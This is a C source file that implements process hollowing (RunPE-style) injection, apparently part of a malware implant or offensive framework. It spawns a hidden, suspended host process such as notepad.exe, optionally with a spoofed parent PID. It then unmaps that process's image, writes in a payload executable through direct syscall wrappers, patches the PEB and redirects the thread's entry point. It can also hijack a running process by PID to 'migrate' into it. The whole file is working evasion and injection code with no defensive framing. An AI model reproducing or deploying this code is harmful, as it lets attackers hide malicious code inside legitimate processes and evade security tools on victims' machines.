/**
 * process_hollow.c - Process hollowing (RunPE-style) injection
 */
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "../../include/evasion.h"
#include "../../include/syscalls.h"

#ifndef ProcessBasicInformation
#define ProcessBasicInformation 0
#endif

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

#define DEFAULT_SPAWN_EXE "C:\\Windows\\System32\\notepad.exe"

static BOOL pe_validate(BYTE *payload, DWORD payload_size,
                        PIMAGE_DOS_HEADER *dos_out, PIMAGE_NT_HEADERS *nt_out) {
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;

    if (!payload || payload_size < sizeof(IMAGE_DOS_HEADER))
        return FALSE;

    dos = (PIMAGE_DOS_HEADER)payload;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;
    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > payload_size)
        return FALSE;

    nt = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    if (dos_out) *dos_out = dos;
    if (nt_out) *nt_out = nt;
    return TRUE;
}

static BYTE *pe_build_local_image(BYTE *payload, DWORD payload_size, DWORD *image_size_out) {
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sec;
    BYTE *local;
    WORD i;

    if (!pe_validate(payload, payload_size, &dos, &nt))
        return NULL;

    local = (BYTE *)VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!local)
        return NULL;

    CopyMemory(local, payload, nt->OptionalHeader.SizeOfHeaders);

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0 &&
            sec[i].PointerToRawData + sec[i].SizeOfRawData <= payload_size) {
            CopyMemory(local + sec[i].VirtualAddress,
                       payload + sec[i].PointerToRawData,
                       sec[i].SizeOfRawData);
        }
    }

    if (image_size_out)
        *image_size_out = nt->OptionalHeader.SizeOfImage;
    return local;
}

static BOOL pe_apply_relocations(BYTE *image, PIMAGE_NT_HEADERS nt, ULONGLONG new_base) {
    ULONGLONG delta = new_base - nt->OptionalHeader.ImageBase;
    DWORD reloc_rva;
    DWORD reloc_size;
    PIMAGE_BASE_RELOCATION reloc;

    if (delta == 0)
        return TRUE;

    reloc_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    reloc_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    if (reloc_rva == 0 || reloc_size == 0)
        return FALSE;

    reloc = (PIMAGE_BASE_RELOCATION)(image + reloc_rva);
    while (reloc->VirtualAddress && reloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *entry = (WORD *)(reloc + 1);
        DWORD j;

        for (j = 0; j < count; j++) {
            WORD type = entry[j] >> 12;
            WORD offset = entry[j] & 0xFFF;

            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG *patch = (ULONGLONG *)(image + reloc->VirtualAddress + offset);
                *patch += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD *patch = (DWORD *)(image + reloc->VirtualAddress + offset);
                *patch += (DWORD)delta;
            }
        }

        reloc = (PIMAGE_BASE_RELOCATION)((BYTE *)reloc + reloc->SizeOfBlock);
        if ((BYTE *)reloc >= image + reloc_rva + reloc_size)
            break;
    }

    nt->OptionalHeader.ImageBase = new_base;
    return TRUE;
}

static BOOL pe_protect_sections(HANDLE hProcess, PVOID remote_base, PIMAGE_NT_HEADERS nt) {
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    WORD i;

    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        ULONG prot = PAGE_READONLY;
        DWORD chars = sec[i].Characteristics;

        if (chars & IMAGE_SCN_MEM_EXECUTE) {
            if (chars & IMAGE_SCN_MEM_WRITE)
                prot = PAGE_EXECUTE_READWRITE;
            else
                prot = PAGE_EXECUTE_READ;
        } else if (chars & IMAGE_SCN_MEM_WRITE) {
            prot = PAGE_READWRITE;
        }

        if (sec[i].Misc.VirtualSize == 0)
            continue;

        PVOID sec_base = (BYTE *)remote_base + sec[i].VirtualAddress;
        SIZE_T sec_size = sec[i].Misc.VirtualSize;
        ULONG old = 0;
        sys_NtProtectVirtualMemory(hProcess, &sec_base, &sec_size, prot, &old);
    }
    return TRUE;
}

static BOOL hollow_write_image(HANDLE hProcess, HANDLE hThread, CONTEXT *ctx,
                               BYTE *pe_file, DWORD pe_size,
                               char *out, int out_size) {
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_NT_HEADERS nt_local;
    BYTE *local_image = NULL;
    DWORD image_size = 0;
    PVOID remote_base = NULL;
    PVOID peb_image_base = NULL;
    SIZE_T bytes_rw = 0;
    BOOL ok = FALSE;

    if (!pe_validate(pe_file, pe_size, &dos, &nt)) {
        _snprintf(out, (size_t)out_size, "invalid PE payload");
        return FALSE;
    }

    local_image = pe_build_local_image(pe_file, pe_size, &image_size);
    if (!local_image) {
        _snprintf(out, (size_t)out_size, "failed to build local PE image");
        return FALSE;
    }

    nt_local = (PIMAGE_NT_HEADERS)(local_image + dos->e_lfanew);
    remote_base = (PVOID)nt_local->OptionalHeader.ImageBase;

#ifdef _WIN64
    if (sys_NtReadVirtualMemory(hProcess, (PVOID)(ctx->Rdx + 0x10),
                                &peb_image_base, sizeof(PVOID), &bytes_rw) != STATUS_SUCCESS ||
        bytes_rw != sizeof(PVOID)) {
        _snprintf(out, (size_t)out_size, "NtReadVirtualMemory PEB failed");
        goto done;
    }
#else
    if (sys_NtReadVirtualMemory(hProcess, (PVOID)(ctx->Ebx + 8),
                                &peb_image_base, sizeof(PVOID), &bytes_rw) != STATUS_SUCCESS ||
        bytes_rw != sizeof(PVOID)) {
        _snprintf(out, (size_t)out_size, "NtReadVirtualMemory PEB failed");
        goto done;
    }
#endif

    if (peb_image_base)
        sys_NtUnmapViewOfSection(hProcess, peb_image_base);

    {
        SIZE_T alloc_size = nt_local->OptionalHeader.SizeOfImage;
        NTSTATUS st = sys_NtAllocateVirtualMemory(
            hProcess, &remote_base, &alloc_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (st != STATUS_SUCCESS || !remote_base) {
            remote_base = NULL;
            st = sys_NtAllocateVirtualMemory(
                hProcess, &remote_base, &alloc_size,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        }
        if (st != STATUS_SUCCESS || !remote_base) {
            _snprintf(out, (size_t)out_size, "NtAllocateVirtualMemory failed");
            goto done;
        }
    }

    if (!pe_apply_relocations(local_image, nt_local, (ULONGLONG)remote_base)) {
        _snprintf(out, (size_t)out_size, "relocation failed");
        goto done;
    }

    {
        SIZE_T written = 0;
        if (sys_NtWriteVirtualMemory(hProcess, remote_base, local_image,
                                     nt_local->OptionalHeader.SizeOfImage,
                                     &written) != STATUS_SUCCESS) {
            _snprintf(out, (size_t)out_size, "NtWriteVirtualMemory image failed");
            goto done;
        }
    }

    pe_protect_sections(hProcess, remote_base, nt_local);

#ifdef _WIN64
    {
        SIZE_T written = 0;
        if (sys_NtWriteVirtualMemory(hProcess, (PVOID)(ctx->Rdx + 0x10),
                                     &remote_base, sizeof(PVOID), &written) != STATUS_SUCCESS) {
            _snprintf(out, (size_t)out_size, "NtWriteVirtualMemory PEB base failed");
            goto done;
        }
    }
    ctx->Rip = (DWORD64)remote_base + nt_local->OptionalHeader.AddressOfEntryPoint;
#else
    {
        SIZE_T written = 0;
        if (sys_NtWriteVirtualMemory(hProcess, (PVOID)(ctx->Ebx + 8),
                                     &remote_base, sizeof(PVOID), &written) != STATUS_SUCCESS) {
            _snprintf(out, (size_t)out_size, "NtWriteVirtualMemory PEB base failed");
            goto done;
        }
    }
    ctx->Eax = (DWORD)remote_base + nt_local->OptionalHeader.AddressOfEntryPoint;
#endif

    if (sys_NtSetContextThread(hThread, ctx) != STATUS_SUCCESS) {
        _snprintf(out, (size_t)out_size, "NtSetContextThread failed");
        goto done;
    }

    _snprintf(out, (size_t)out_size, "Hollowed at %p", remote_base);
    ok = TRUE;

done:
    if (local_image)
        VirtualFree(local_image, 0, MEM_RELEASE);
    return ok;
}

static HANDLE find_process_thread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    HANDLE hThread = NULL;

    if (snap == INVALID_HANDLE_VALUE)
        return NULL;

    THREADENTRY32 te = {sizeof(te)};
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hThread)
                    break;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return hThread;
}

BOOL inject_process_hollow(
    const char *target_exe,
    BYTE *payload,
    DWORD payload_size,
    DWORD parent_pid,
    char *out,
    int out_size)
{
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOA si = {0};
    CONTEXT ctx = {0};
    const char *spawn_exe = target_exe;
    BOOL ok;

    if (!payload || !out || out_size <= 0)
        return FALSE;

    if (!spawn_exe || !spawn_exe[0])
        spawn_exe = DEFAULT_SPAWN_EXE;

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (parent_pid) {
        ok = create_process_ppid_spoof(parent_pid, spawn_exe, NULL, NULL, TRUE, &pi);
    } else {
        ok = CreateProcessA(spawn_exe, NULL, NULL, NULL, FALSE,
                            CREATE_SUSPENDED | CREATE_NO_WINDOW,
                            NULL, NULL, &si, &pi);
    }
    if (!ok) {
        _snprintf(out, (size_t)out_size, "CreateProcess failed: %lu", GetLastError());
        return FALSE;
    }

    ctx.ContextFlags = CONTEXT_FULL;
    if (sys_NtGetContextThread(pi.hThread, &ctx) != STATUS_SUCCESS) {
        _snprintf(out, (size_t)out_size, "NtGetContextThread failed");
        sys_NtTerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    ok = hollow_write_image(pi.hProcess, pi.hThread, &ctx, payload, payload_size, out, out_size);
    if (!ok) {
        sys_NtTerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    sys_NtResumeThread(pi.hThread, NULL);

    {
        char msg[256];
        _snprintf(msg, sizeof(msg), "Hollowed PID %lu %s", pi.dwProcessId, out);
        _snprintf(out, (size_t)out_size, "%s", msg);
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

BOOL inject_process_hollow_pid(
    DWORD target_pid,
    BYTE *payload,
    DWORD payload_size,
    char *out,
    int out_size)
{
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    CONTEXT ctx = {0};
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG ret_len = 0;
    BOOL ok = FALSE;

    if (!payload || target_pid == 0 || !out || out_size <= 0)
        return FALSE;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) {
        _snprintf(out, (size_t)out_size, "OpenProcess failed: %lu", GetLastError());
        return FALSE;
    }

    hThread = find_process_thread(target_pid);
    if (!hThread) {
        _snprintf(out, (size_t)out_size, "no thread found for PID %lu", (unsigned long)target_pid);
        CloseHandle(hProcess);
        return FALSE;
    }

    if (sys_NtSuspendThread(hThread, NULL) != STATUS_SUCCESS) {
        _snprintf(out, (size_t)out_size, "NtSuspendThread failed");
        goto cleanup;
    }

    if (sys_NtQueryInformationProcess(hProcess, ProcessBasicInformation,
                                      &pbi, sizeof(pbi), &ret_len) != STATUS_SUCCESS ||
        !pbi.PebBaseAddress) {
        _snprintf(out, (size_t)out_size, "NtQueryInformationProcess failed");
        goto resume_cleanup;
    }

    ctx.ContextFlags = CONTEXT_FULL;
    if (sys_NtGetContextThread(hThread, &ctx) != STATUS_SUCCESS) {
        _snprintf(out, (size_t)out_size, "NtGetContextThread failed");
        goto resume_cleanup;
    }

#ifdef _WIN64
    ctx.Rdx = (DWORD64)pbi.PebBaseAddress;
#else
    ctx.Ebx = (DWORD)pbi.PebBaseAddress;
#endif

    ok = hollow_write_image(hProcess, hThread, &ctx, payload, payload_size, out, out_size);
    if (ok) {
        char msg[256];
        _snprintf(msg, sizeof(msg), "Migrated to PID %lu via process hollowing", (unsigned long)target_pid);
        _snprintf(out, (size_t)out_size, "%s", msg);
        sys_NtResumeThread(hThread, NULL);
    }

resume_cleanup:
    if (!ok)
        sys_NtResumeThread(hThread, NULL);

cleanup:
    if (hThread)
        CloseHandle(hThread);
    if (hProcess)
        CloseHandle(hProcess);
    return ok;
}

BOOL read_own_pe_file(BYTE **pe_out, DWORD *pe_size_out) {
    char path[MAX_PATH];
    HANDLE hFile;
    DWORD file_size, read_bytes;
    BYTE *buf;

    if (!pe_out || !pe_size_out)
        return FALSE;

    *pe_out = NULL;
    *pe_size_out = 0;

    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0)
        return FALSE;

    hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size == 0) {
        CloseHandle(hFile);
        return FALSE;
    }

    buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, file_size);
    if (!buf) {
        CloseHandle(hFile);
        return FALSE;
    }

    if (!ReadFile(hFile, buf, file_size, &read_bytes, NULL) || read_bytes != file_size) {
        HeapFree(GetProcessHeap(), 0, buf);
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    *pe_out = buf;
    *pe_size_out = file_size;
    return TRUE;
}
